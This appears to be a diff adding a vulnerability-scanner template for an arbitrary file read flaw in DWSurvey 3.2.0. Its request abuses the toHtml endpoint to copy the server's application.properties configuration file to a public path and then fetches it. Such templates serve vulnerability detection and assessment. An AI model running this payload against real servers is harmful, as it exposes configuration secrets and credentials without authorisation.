@@ -1,0 +1,39 @@
+id: dwsurvey-arbitrary-file-read
+info:
+  name: Dwsurvey Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    DWSurvey is a convenient, efficient, and stable survey questionnaire system, an open source questionnaire form system based on JAVA WEB. The filePath parameter of the ToHtmlServlet.java file in the dwsurvey-oss-v3.2.0 version has an arbitrary file reading vulnerability.
+  reference:
+    - https://github.com/wkeyuan/DWSurvey
+    - https://www.surveyform.cn
+http:
+  - raw:
+      - |
+        GET /toHtml?filePath=/&fileName=randomfile.txt&url=/WEB-INF/classes/conf/application.properties HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        part: header
+        regex:
+          - 'randomfile\.txt'
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /randomfile.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "settings"
